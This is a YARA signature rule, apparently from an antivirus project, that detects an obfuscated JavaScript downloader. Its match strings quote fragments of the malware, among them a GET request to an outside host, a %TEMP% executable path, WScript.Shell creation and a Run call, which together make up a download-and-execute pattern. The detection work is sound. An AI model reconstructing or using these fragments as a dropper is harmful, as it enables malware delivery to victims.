rule sig_20160328_2763e486cb73a4a0d1ffe55fc75688d2 {
  meta:
    description = "datamaliciousorder - file 20160328_2763e486cb73a4a0d1ffe55fc75688d2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ddc0f08dd6e6cd0aafdf27d4fc6366f01209ee3ffcf636adc46c80b9d05fe578"

  strings:
    $s1  = "Fwoiz[Mbunp](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s2  = "function Ocagd() {return Tajmtb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"7zotl4paKfmas.exe\";};" fullword ascii
    $s3  = "do {WScript[Uthcqfubr](Blidsjhzl() * 11)} while (Fwoiz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Tajmtb = function Sdees() {return WScript[Zehjrsxdgy](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Hplwnjqyde(Pzpfygskcf, Viylunl){return Pzpfygskcf - Viylunl;};" fullword ascii
    $s6  = "function Eftsdetmdi(Seyudea){Tajmtb[\"Run\"](Seyudea, Ipmtscbv, Ipmtscbv);};" fullword ascii
    $s7  = "function Ooqyswsw(Brtvss) {var Ifmqwrgtjf = (1, 2, 3, 4, 5, Brtvss); return Ifmqwrgtjf;};" fullword ascii
    $s8  = "Xefyy = true; " fullword ascii
    $s9  = "function Ftrxohpihv(){return Zehjrsxdgy;};" fullword ascii
    $s10 = "var Nwlcebfwq = false;" fullword ascii
    $s11 = "function Uwsoxlujhv(){return Ynszh;};" fullword ascii
    $s12 = " while (Owsamr){" fullword ascii
    $s13 = "var Aznpssj = new this[\"Date\"]();" fullword ascii
    $s14 = "return Hplwnjqyde(Lflejyknr, Kqzplu);" fullword ascii
    $s15 = "var Xefyy = false;" fullword ascii
    $s16 = "function Blidsjhzl(){return 22;};" fullword ascii
    $s17 = "function Iupgagmein()" fullword ascii
    $s18 = "function Wyhtrjwt() {return ((Lggvca == true) && (Lggvca == Xefyy)) ? 1 : Ipmtscbv;};" fullword ascii
    $s19 = "} catch(Hxrtdzedq){Owsamr = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii
    $s20 = "Lggvca = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}